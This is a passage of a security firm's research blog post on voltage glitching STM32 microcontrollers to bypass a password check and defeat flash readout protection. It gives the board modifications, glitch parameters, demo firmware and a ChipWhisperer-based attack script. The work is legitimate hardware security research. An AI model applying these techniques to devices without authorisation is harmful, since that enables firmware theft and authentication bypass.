                                    
                                </div></a></nav></div></header><section role="main" itemprop="mainContentOfPage"><div class="content-wrapper"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://sec-consult.com/blog/","name":"Blog"}}]}</script><nav class="breadcrumbs-container" aria-label="Breadcrumb"><ol class="breadcrumbs"><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/" target="">
                                Home
                            </a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/blog/" target="">
                                Blog
                            </a></li><li class="breadcrumbs__item"><span class="breadcrumbs__text">SECGlitcher (Part 1) - Reproducible Voltage Glitching on STM32 Microcontrollers</span></li></ol></nav><!--TYPO3SEARCH_begin--><section class="section section__news_newsdetail"><div id="c42" class="frame frame-default frame-type-news_newsdetail frame-layout-0"><div class="news news-single"><div class="article" itemscope="itemscope" itemtype="http://schema.org/Article"><div class="news-detail news-detail--default"><div class="news-detail__top"><h1 itemprop="headline">SECGlitcher (Part 1) - Reproducible Voltage Glitching on STM32 Microcontrollers</h1><time class="news-detail__date" itemprop="datePublished"
                      datetime="2024-01-11">
                    11.01.2024
                </time><!-- categories --><span class="news-list-category">
	
		
				research
			
	
</span><div class="news-detail__teaser news-detail__teaser--no-container" itemprop="description"><p>Voltage glitching is a technique used in hardware security testing to try to bypass or modify the normal operation of a device by injecting a glitch, or a brief but precise disruption, into its power supply voltage.</p></div><figure class="news-detail__figure"><picture><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_dc28fdb294.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_1b128ae2b0.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_d15ad7e02e.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_4d808d6d47.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_b44f6a4ef7.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_2dd1667ab0.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_c9473e562b.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_19bbc0939f.png" type="image/png" media="(min-width: 100px)"><img class="news-detail__img" loading="lazy" src="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_b44f6a4ef7.png" width="1110" height="571" alt="Glitching Setup" /></picture></figure></div><div class="news-detail__text" itemprop="articleBody"><h2>TL;DR</h2><p>STM32 microcontrollers are well known as being versatile and affordable and are hence frequently being used in IoT products. In part one of our glitching blog post series, Gerhard Hechenberger and Steffen Robertz, both <a href="https://sec-consult.com/security-testing/iot-and-embedded-systems-security/" target="_blank">IoT and embedded systems security experts</a>, will showcase their research about glitching a target device in order to skip authentication on a command line as well as to read the firmware from a controller with enabled readout protection. Further, they developed an abstraction layer for the&nbsp;<a href="https://www.newae.com/chipwhisperer" target="_blank" rel="noreferrer">ChipWhisperer</a>&nbsp;devices with the goal to speed up the development of glitching attacks during customer projects in our&nbsp;<a href="https://sec-consult.com/security-testing/iot-and-embedded-systems-security/" target="_blank">hardware laboratory</a>.</p><p>The following blog post describes our approach on voltage glitching and how we try to make it more accessible and usable during security assessments. To do this, we started tinkering with the widely used STM32 microcontroller series and built the <strong>SECGlitcher</strong> script on top of the famous&nbsp;<a href="https://www.newae.com/chipwhisperer" target="_blank" rel="noreferrer nofollow">ChipWhisperer</a>&nbsp;tool. But first, we will briefly revisit the basics.</p></div><section class="section section__textpic"><div id="c4718" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/7/5/csm_Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo_881af9df07.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/7/5/csm_Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo_b4127c7d21.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/7/5/csm_Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo_b542089691.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/7/5/csm_Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo_d8d33407b7.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/7/5/csm_Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo_0aff9ef5ef.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/7/5/csm_Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo_5884470a17.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_1_Voltage_glitch_as_seen_on_an_oscilloscope_Logo.png" width="799" height="515" alt="Voltage glitch as seen on an oscilloscope" /></picture></a><figcaption class="image-caption">
            Figure 1: Voltage glitch as seen on an oscilloscope
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h2>Introduction to Voltage Glitching</h2><p>Voltage glitching is a technique used in hardware security testing to try to bypass or modify the normal operation of a device by injecting a glitch, or a brief but precise disruption, into its power supply voltage. Such&nbsp;attacks work by manipulating the power supply voltage of a device at a specific moment of its operation, typically when it is performing a critical operation or executing a security-sensitive function. By disrupting the power supply voltage, the targeted device may behave in unexpected ways, which is exhibited by the device as skipping instructions or executing them incorrectly. This can be exploited to achieve a range of security objectives, such as bypassing authentication, extracting secret keys, or altering the behavior of the device.&nbsp;The pictures (figure 1 and figure 2) below show how such an attack is set up.</p></div></div></div></section><section class="section section__textpic"><div id="c4719" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--above textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_2_Glitching_setup_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_4566318f58.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_c0473a4b5f.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_18a4f7cfdd.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_189b039e6c.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_1e93c80cfc.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_ab6694907f.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_651524559f.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_466d4be14c.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/4/1/csm_Figure_2_Glitching_setup_Logo_b8303e98fe.png" width="1100" height="566" alt="Glitching setup with ChipWhisperer Pro, STM32 Nucleo development board and power supply" /></picture></a><figcaption class="image-caption">
            Figure 2: Glitching setup with ChipWhisperer Pro, STM32 Nucleo development board and power supply. The oscilloscope is located above the upper left part of the picture (not displayed).
        </figcaption></figure></div><div class="textpic__text textpic__text--above textpic__text--center"><p>Although many people tend to use their custom built tools, more or less professional tools are available to exploit such vulnerabilities. This includes the&nbsp;<a href="https://www.newae.com/chipwhisperer" target="_blank" rel="noreferrer">ChipWhisperer</a>&nbsp;series, which evolved from the master thesis "<a href="https://dalspace.library.dal.ca/handle/10222/73002" target="_blank" rel="noreferrer">A Framework for Embedded Hardware Security Analysis</a>" by Colin O'Flynn and can be considered as the most common glitching device. We chose the same device for our work, as it is readily available.</p><p>Similar to this&nbsp;<a href="https://circuitcellar.com/research-design-hub/basics-of-design/revisiting-code-readout-protection-claims/" target="_blank" rel="noreferrer">article</a>&nbsp;by Colin O'Flynn, where he recently published some related work, we're not about to disclose a new vulnerability here. However, we're taking another step to make glitching more accessible and reproducible. A lot of work was already previously done on glitching the STM32 series, a good write-up is a blog post by&nbsp;Raccoon Security&nbsp;"<a href="https://prog.world/read-secure-firmware-from-stm32f1xx-flash-using-chipwhisperer/" target="_blank" rel="noreferrer">Read secure firmware from STM32F1xx flash using ChipWhisperer</a>" from 2020. However, the most widely known work exploiting this flaw on STM32 devices is probably the&nbsp;<a href="https://www.theverge.com/2022/1/24/22898712/crypto-hardware-wallet-hacking-lost-bitcoin-ethereum-nft" target="_blank" rel="noreferrer">recovery of $2 million in crypto coins by Joe Grand</a>&nbsp;from 2022, which is built up on the work of Kraken Security Labs from 2020 (read it here: "<a href="https://blog.kraken.com/post/3662/kraken-identifies-critical-flaw-in-trezor-hardware-wallets/" target="_blank" rel="noreferrer">Kraken Identifies Critical Flaw in Trezor Hardware Wallets</a>").</p></div></div></div></section><section class="section section__text"><div id="c4720" class="frame frame-default frame-type-text frame-layout-0"><h2>Attacking the STM32 Series</h2><p>The STM32 series are 32-bit microcontrollers based on the Arm Cortex-M processor and are widely used in embedded systems. Different variants are suitable for low-power as well as for high-performance operations. One of its security options is the so-called&nbsp;<a href="https://stm32world.com/wiki/STM32_Readout_Protection_(RDP)" target="_blank" rel="noreferrer">Readout Protection (RDP)</a>&nbsp;. The STM32 offers three different levels:</p><p>RDP Level 0: No protection</p><ul class="list-normal"><li>Full debugging is allowed</li><li>Full access while in system bootloader</li></ul><p>RDP Level 1: Read protection</p><ul class="list-normal"><li>Access (read, erase, program) to Flash memory is forbidden while debugging</li><li>Other memories such as the bootloader memory can be accessed via JTAG</li><li>Access (read, erase, program) to any memory is forbidden while in system bootloader</li><li>Everything else can be read, e.g. RAM and registers</li><li>Reset to RDP level 0 erases whole Flash memory</li></ul><p>RDP Level 2: Read &amp; debug protection</p><ul class="list-normal"><li>Debugging is forbidden by disabling the JTAG and SWD interfaces</li><li>Starting system bootloader is forbidden</li><li>Reset to RDP Level 0/1 is not possible</li></ul><p>To read the Flash memory on RDP2 locked devices, two protection levels must be circumvented.</p><h3>RDP2 Downgrade to RDP1</h3><p>On boot, the RDP register value is checked. A specific value has to be set for RDP2 (0xCC) and RDP0 (0xAA), all other values default to RDP1 (however, often 0xBB or 0x55 is set). Therefore, if the read operation on the RDP register reads a wrong value (due to a voltage glitch), the device will think it's in RDP level 1. Thus, debug interfaces and the bootloader will become accessible.</p><h3>RDP1 Memory Reading</h3><p>The internal system bootloader is available with RDP level 1 and provides a "Read Memory" operation which reads 256 bytes from a user-supplied memory address. However, this operation is not allowed in RDP1. This is ensured by the microcontroller checking the RDP state before every read operation. If this check is tampered with (by a voltage glitch), it will be skipped and 256 bytes of memory read. By glitching the read command repeatedly, 256 byte firmware chunks can be read and reassembled into a complete firmware dump.&nbsp;</p><h2>SECGlitcher</h2><p>During the last years, much work was done on Voltage Glitching attacks, as already described in the introduction above. However, we noticed that recreating glitches can be hard, mostly due to the usage of custom hardware and often unpublished glitching parameters and setups. Therefore, we took a structured approach which can hopefully be extended in the future on other chips and boards:</p><p>We created the SECGlitcher, which is based on the well-established&nbsp;<a href="https://chipwhisperer.readthedocs.io/en/latest/index.html" target="_blank" rel="noreferrer">ChipWhisperer API</a>, but is easier to use for default use cases such as UART or GPIO triggers.</p><h3>Features</h3><p>We developed the SECGlitcher as we noted, that glitching scripts across all boards are always structured similar. So why not create a simple class that wraps all of the init commands and also gathers the results? This results in smaller, clearly structured scripts that can be easily compared across different boards and chips.&nbsp;</p><p><strong>Reproduce glitches with parameters:&nbsp;</strong>During our glitching experiments, we were always struggling with the same question: What do we use as initial search parameters? Depending on how closely we guess the glitch duration as well as trigger offset, we can find valid glitches after minutes. However, if our estimate is way off, we will take days to discover interesting glitching ranges. Thus, we decided to include a database in the SECGlitcher, which contains valid glitch width settings that we have discovered previously for each MCU. Hence, your valid parameters shouldn't be off too far (of course this also depends on the used board and capacitance of the power rail).&nbsp;</p><p><strong>Easy headless usage:&nbsp;</strong>The use of Jupyter notebooks as featured by the ChipWhisperer may be great for some initial experiments, however, for conducting glitching tests in an efficient and scalable manner, we needed a solution that can be conveniently controlled remotely, e.g., is able to run on a (headless) server. Therefore, the SECGlitcher class is built to be used in command-line only scripts (though we implemented some interactive elements, just in case you want to showcase some stuff).</p><p><strong>Convenient data aggregation:&nbsp;</strong>The need for fault-proof and convenient data aggregation comes right after the previous feature. To prevent data loss, data can not only be printed out to the console but can also be saved as CSV file. These CSV files, created from one or multiple glitching attempts, can subsequently be aggregated and visualized by a provided helper script. With this, it is possible to show potential valid glitching parameters of multiple (partial) tries.</p><p><strong>Easy setup:</strong>&nbsp;An easy setup is important to keep the entry barrier low, luckily, using the SECGlitcher class is simple: Create a new virtual environment and install the&nbsp;<code>chipwhisperer</code>&nbsp;as well as some other required packages with PIP. That's it.</p></div></section><section class="section section__textpic"><div id="c4721" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo.jpg" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/b/0/csm_Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo_a4c73a9e58.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/b/0/csm_Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo_8cabe1f8c0.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/b/0/csm_Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo_79018132cd.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/b/0/csm_Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo_d6c1d1554c.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo.jpg" type="image/jpg" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo.jpg" type="image/jpg" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/b/0/csm_Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo_9220c2197c.jpg" type="image/jpg" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/b/0/csm_Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo_d09f6db6dd.jpg" type="image/jpg" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_3_Modified_Nucleo_STM32L073RZ_development_board_Logo.jpg" width="830" height="720" alt="Modified Nucleo STM32L073RZ development board" /></picture></a><figcaption class="image-caption">
            Figure 3: Modified Nucleo STM32L073RZ development board
        </figcaption></figure><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/a/3/csm_Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed_4c485b37d1.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/a/3/csm_Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed_0554d36164.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/a/3/csm_Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed_7883d70f13.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/a/3/csm_Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed_30376bdf49.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/a/3/csm_Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed_4e7883beef.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/a/3/csm_Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed_5c50e9b055.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/a/3/csm_Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed_15320b454e.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/a/3/csm_Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed_71c126972e.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/a/3/csm_Figure_4_Marked_capacitors_in_the_schematic_need_to_be_removed_a3a03e388b.png" width="1100" height="360" alt="Marked capacitors in the schematic need to be removed (Source: MB1136 sheet 1)" /></picture></a><figcaption class="image-caption">
            Figure 4: Marked capacitors in the schematic need to be removed (Source: MB1136 sheet 1)
        </figcaption></figure><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/c/e/csm_Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed_4e77f536ad.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/c/e/csm_Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed_bb51844c14.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/c/e/csm_Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed_10180435d4.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/c/e/csm_Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed_8d8cdb5831.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/_processed_/c/e/csm_Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed_6974973a67.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/c/e/csm_Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed_14f69897a1.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/c/e/csm_Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed_d25242d468.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/c/e/csm_Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed_173b0f55fa.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/_processed_/c/e/csm_Figure_5_Marked_capacitors_in_the_schematic_need_to_be_removed_f1db624eac.png" width="1100" height="426" alt="Marked capacitors in the schematic need to be removed (Source: MB1136 sheet 2)" /></picture></a><figcaption class="image-caption">
            Figure 5: Marked capacitors in the schematic need to be removed (Source: MB1136 sheet 2)
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><h3>Setup</h3><p>For glitching, the&nbsp;<a href="https://www.newae.com/glitching" target="_blank" rel="noreferrer">Crowbar Glitching</a>&nbsp;approach was chosen, where the power rail of the chip is shorted to ground. The basic setup for glitching Nucleo boards is described exemplary for the STM23L073RZ board. To start, the board needs some modifications. This includes removing most of the decoupling capacitors on the power line and adding a pin header where the glitcher can short the power rail. The modified board and the schematics (available as&nbsp;<a href="https://www.st.com/resource/en/schematic_pack/mb1136-default-c03_schematic.pdf" target="_blank" rel="noreferrer nofollow">MB1136</a>) for the removal of the capacitors are shown below in figure 3, 4 and 5.</p></div></div></div></section><section class="section section__textpic"><div id="c4722" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/6/6/csm_Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo_00bc005a7d.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/6/6/csm_Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo_5e2a71a422.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/6/6/csm_Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo_96f4b27f54.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/6/6/csm_Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo_d8d84761f3.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/6/6/csm_Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo_392e17d8cd.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/6/6/csm_Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo_4506cfa06d.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/6/6/csm_Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo_7f48fb7ea4.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_6_Chip_supply_voltage_curve_while_being_glitched_Logo.png" width="1065" height="700" alt="Chip supply voltage curve while being glitched" /></picture></a><figcaption class="image-caption">
            Figure 6: Chip supply voltage curve while being glitched
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>The pin header was added to the now empty pads of the C28 capacitor. C23 was added again to limit the voltage overshooting after the glitch.</p><p>Why do we have to remove most of the capacitors? Capacitors "store" power, if a power rail with a huge capacitance is shorted, the voltage will drop to zero only slowly. If there is only a small capacity, the voltage drop will be steep - and this is what we want for glitching. However, if there is some kind of power management, the board will try to keep the voltage stable and thus causes an sharp overshoot as soon as the short is released (compare to trying to push a closed door open when suddenly someone opens it from the other side). This might damage the chip, therefore, we typically keep some capacitors.</p><p>This setup will now result in a glitch which looks like on the oscilloscope as shown below in figure 6. There are four different parts of the chip voltage curve:</p><ul class="list-normal"><li>A: Normal operation, constant 3.3V</li><li>B: Glitch, power rail is shorted to ground while the voltage regulator tries to keep the voltage up but fails in doing this</li><li>C: The short is released, the power spikes due to the voltage regulator still trying to push the voltage back (up)</li><li>D: The voltage regulator starts to recover the constant 3.3V and stabilizes the voltage rail after some transient oscillation</li></ul></div></div></div></section><section class="section section__text"><div id="c4723" class="frame frame-default frame-type-text frame-layout-0"><h3>Setting up the Glitch</h3><p>When glitching a different board, there are multiple things to consider in the ChipWhisperer configuration. The ChipWhisperer always has to be clocked, as we do not have access to the target internal clock, we just select a high frequency that the ChipWhisperer can generate on its own. However, we will not be synchronized to the target's clock. Hence, we cannot control if we glitch at the beginning of the target's instruction execution or at the end of it.</p><p>The next important metric is the glitch width. This is the time for which the power rail is shorted to ground. It will be measured in clock cycles of the ChipWhisperer. This is one of the most important glitch characteristics. If its chosen too small, the voltage will not drop far enough and the chip's operation is not affected. If it's chosen too high, the chip will be reset and restart its operation from the first instruction. A proper glitch, were the MCU is not reset, but also does not operate properly is right in the middle of these two values. The second parameter is the glitch offset. This parameter will wait for a trigger (e.g. a pin state changing or a certain byte being received over UART) and then wait for a set amount of ChipWhisperer clock cycles before inserting the glitch. Thus, this parameter can be used to time the glitch with the instruction or register load that we want to affect.&nbsp;</p><p>As you can tell, it is a very tedious task to identify these parameters for a blackbox board and chip. This is why we created the SECGlitcher. The script comes with a YAML configuration file where we store all valid glitching widths that we discovered for a certain board. This way, we can reuse old settings and improve the search range for valid parameters. We included the offset for some demo applications. However, this parameter cannot be estimated beforehand, as it changes for each program (unless you have access to the compiled code, then of course you could count instruction cycles from the trigger and estimate how many ChipWhisperer cycles would equal this case). In order to give us the most precision in our scanning, we run the ChipWhisperer's clock at 100MHz.</p><p>The SECGlitcher is setup as a abstract class that you have to overload. Some function are already implemented, while others have to be written from scratch. We will now show an example for a simple password check glitch on the Nucleo STM23L073RZ board. The target is running following example code:</p><p><strong>Target MCU code</strong></p><pre><code class="language-cpp">HAL_Init();
SystemClock_Config();
MX_GPIO_Init();
MX_USART2_UART_Init();
 
char set_pw[] = "mysupersecurepassword";
char check_pw[128];
int check_ok = false;
 
char s1[] = "Init successful\n";
HAL_UART_Transmit(&amp;huart2, (uint8_t*)s1, sizeof(s1), HAL_MAX_DELAY);
 
while (!check_ok) {
  char s2[] = "Please enter password:\n";
  HAL_UART_Transmit(&amp;huart2, (uint8_t*)s2, sizeof(s2), HAL_MAX_DELAY);
   
  int i = 0;
  volatile char c = '\0';
  while (c != '\n' &amp;&amp; c != '\r' &amp;&amp; i &lt; 127) {
    HAL_UART_Receive(&amp;huart2, (uint8_t*)&amp;c, 1, HAL_MAX_DELAY);
    HAL_UART_Transmit(&amp;huart2, (uint8_t*)&amp;c, 1, HAL_MAX_DELAY);
    if (c == '\n' || c == '\r') {
      check_pw[i] = '\0';
    } else {
      check_pw[i] = c;
    }
    i++;
  }
  check_pw[127] = '\0';
 
  if (strcmp(set_pw, check_pw) == 0) {
    check_ok = true;
  }
}
  
HAL_GPIO_TogglePin(LD2_GPIO_Port, LD2_Pin);
 
char s3[] = "Welcome!\n";
HAL_UART_Transmit(&amp;huart2, (uint8_t*)s3, sizeof(s3), HAL_MAX_DELAY);
char s4[] = "This is your secret: supersecretstring\n";
HAL_UART_Transmit(&amp;huart2, (uint8_t*)s4, sizeof(s4), HAL_MAX_DELAY);</code></pre><p>As we have previously searched for valid glitching parameters on this board, they are already included in the configuration file.</p><pre><code class="language-cpp">stm32l073:
  pw: [27, 29, 150, 159]</code></pre><p>Subsequently, a glitching script can be created using the SECGlitcher as follows:</p><pre><code class="language-python">class MyGlitcher(SECGlitcher):
    def __init__(self, reset_pin='nrst', interactive=False):
        super().__init__(reset_pin)
        self.interactive = interactive
        self.uart = None
 
    def dut_check_init(self):
        log = self.uart.read_until("password:")
        if log.endswith(b"password:\n\x00"):
            return True
        else:
            print("Boot failed!")
            self.scope.io.nrst = "low"
            time.sleep(1)
            return False
 
    def check_glitch(self):
        check = self.uart.readline()
        if b"elcome" in check or b"secret" in check:
            self.add_success()
            print("Glitch successful: Width: {}, Offset: {}".format(*self.success_params[-1]))
            if self.interactive:
                print("Press ENTER to continue")
                input()
        else:
            pass
 
    def dut_uart_init_before_reset(self):
        self.uart = serial.Serial('/dev/ttyACM0', 115200, timeout=0.1)
 
    def dut_uart_write(self):
        self.uart.write(b"\r\n")
 
 
glitcher = MyGlitcher(interactive=True)
glitcher.trigger_setup(trigger='uart', uart_pattern=['\r'])
glitcher.print_config()
glitcher.run(target="stm32l073", app="pw")
glitcher.exit()
glitcher.print_results()
glitcher.save_results()
glitcher.plot_results()</code></pre></div></section><section class="section section__textpic"><div id="c4724" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><img class="lazyload" alt="Password check glitching in action" loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_7_Password_check_glitching_in_action_Logo.gif" width="478" height="268" /></div><div class="textpic__text textpic__text--below textpic__text--center"><p>The short GIF below shows the password check glitching in action. After several tries, the glitch turns out just right and skips the password check without entering the correct password, giving back the secret (Figure 7: Password check glitching in action).</p></div></div></div></section><section class="section section__text"><div id="c4725" class="frame frame-default frame-type-text frame-layout-0"><h3>RDP1 Memory Reading</h3><p>After downgrading the RDP level to 1, we can glitch the memory read command in the now accessible bootloader. STM describes how to enable the bootloader in&nbsp;<a href="https://www.st.com/resource/en/application_note/an2606-stm32-microcontroller-system-memory-boot-mode-stmicroelectronics.pdf" target="_blank" rel="noreferrer">AN2606</a>. We plan on using the UART bootloader on an STM32F429ZI Nucleo board. According to the application note, this means that we can use USART3 or USART1&nbsp; with 115200 8E1 configuration. Further, the "Boot0" pin needs to be pulled high in order to activate the bootloader. Luckily, this pin as well as PB10/11 for USART3 are exposed on the Nucleo header.&nbsp;<a href="https://www.st.com/resource/en/application_note/an3155-usart-protocol-used-in-the-stm32-bootloader-stmicroelectronics.pdf" target="_blank" rel="noreferrer">AN3155</a>&nbsp;now describes the actual used protocol. For clarity, we will omit the needed checksum in the following description. An extensive description of the internal bootloader process can be found in the appendix.</p><p>To activate the bootloader, 